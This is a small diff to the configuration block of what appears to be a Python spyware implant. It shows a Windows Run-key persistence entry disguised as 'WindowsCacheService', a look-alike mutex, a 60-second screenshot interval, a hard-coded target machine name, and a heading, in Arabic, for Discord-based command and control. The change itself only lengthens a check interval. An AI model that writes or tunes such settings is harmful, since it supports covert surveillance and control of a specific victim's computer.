@@ -50,7 +50,7 @@ MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
 STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
 STARTUP_REG_NAME = "WindowsCacheService"
 SCREENSHOT_INTERVAL = 60
-CHECK_INTERVAL = 120
+CHECK_INTERVAL = 300
 TARGET_NAME = "SK5X08-PC"
 
 # ====== إعدادات بوت الديسكورد (C2) ======
